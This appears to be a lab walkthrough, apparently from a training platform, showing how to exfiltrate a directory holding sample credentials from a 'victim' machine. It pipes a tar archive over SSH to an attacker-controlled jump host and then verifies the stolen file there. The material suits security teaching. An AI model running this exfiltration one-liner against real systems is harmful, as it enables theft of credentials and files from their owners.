# Exfiltration Using SSH

In this task, we will demonstrate how to use the SSH protocol to exfiltrate data to an attacking machine. The SSH protocol establishes a secure channel to interact and transfer data between the client and server, ensuring that all transmitted data is encrypted over the network or the Internet.

## Encrypted SSH Communication Channel

To transfer data over SSH, we can use either the Secure Copy Protocol (SCP) or the SSH client. In this scenario, we assume that the `scp` command is unavailable, so we will focus on using the SSH client.

As mentioned earlier, an attacker needs to control a server with an SSH server enabled to receive the exfiltrated data. In this example, we will use the AttackBox as our SSH server. Alternatively, the JumpBox can also be used since it has an SSH server enabled.

## Transferring Sensitive Data

Let’s assume we have gained access to sensitive data that must be transmitted securely. First, connect to the `victim1` or `victim2` machine.

### Data to Be Transferred

```bash
thm@victim1:~$ cat task5/creds.txt
admin:password
Admin:123456
root:toor
```

We will use the same technique discussed in the "Exfiltration Using a TCP Socket" task. This involves using the `tar` command to archive the data and then transferring it.

### Exfiltrating Data from the Victim Machine

```bash
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

#### Command Breakdown:

1. **Archiving the Data**:  
    The `tar` command is used to create an archive of the `task5` directory.

2. **Transferring the Archive**:  
    The archive is passed over SSH. SSH clients allow executing a single command without starting a full session.

3. **Executing Commands on the Server**:  
    The command to be executed on the server is enclosed in double quotes:  
    `"cd /tmp/; tar xpf -"`  
    - `cd /tmp/`: Changes the directory to `/tmp/`.  
    - `tar xpf -`: Extracts the received archive.

After executing the command, the file is successfully transmitted to the attacker machine.

### Verifying the Received Data

On the attacker machine:

```bash
thm@jump-box$ cd /tmp/task5/
thm@jump-box:/tmp/task5$ cat creds.txt
admin:password
Admin:123456
root:toor
```

The data has been successfully exfiltrated and verified.